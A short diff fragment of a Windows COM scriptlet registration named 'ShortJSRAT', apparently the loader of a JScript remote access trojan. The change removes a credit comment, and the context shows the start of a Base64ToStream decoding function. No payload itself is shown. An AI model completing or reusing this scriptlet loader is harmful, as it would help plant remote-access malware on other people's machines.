@@ -3,7 +3,6 @@
 <registration
     progid="ShortJSRAT"
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
-    <!-- Learn from Casey Smith @subTee -->
     <script language="JScript">
         <![CDATA[
             function Base64ToStream(b,l) {
